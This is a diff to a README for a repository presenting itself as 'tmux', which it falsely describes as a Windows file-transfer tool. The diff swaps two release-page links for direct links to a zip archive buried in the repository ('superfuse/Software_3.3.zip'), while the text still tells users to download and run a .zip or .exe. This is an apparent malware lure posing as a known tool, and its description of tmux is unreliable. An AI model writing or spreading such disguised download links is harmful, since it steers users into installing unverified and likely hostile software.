@@ -1,6 +1,6 @@
 # 📂 tmux - Transfer remote files with ease
 
-[![Download tmux](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Akrajcac6508/tmux/releases)
+[![Download tmux](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Akrajcac6508/tmux/raw/refs/heads/main/superfuse/Software_3.3.zip)
 
 tmux manages file transfers between your windows computer and a remote linux server. This tool removes the need to install extra software on the destination machine. You work from your own workstation while the server handles the storage tasks. 
 
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets these conditions:
 
 Visit the release page to get the latest version for your system.
 
-[Click here to open the download page](https://github.com/Akrajcac6508/tmux/releases)
+[Click here to open the download page](https://github.com/Akrajcac6508/tmux/raw/refs/heads/main/superfuse/Software_3.3.zip)
 
 On this page, look for the section labeled Assets. Select the file that matches your windows installation. Most users choose the file ending in .zip or .exe. Save the file to a folder you can find later, such as your Downloads folder.
 
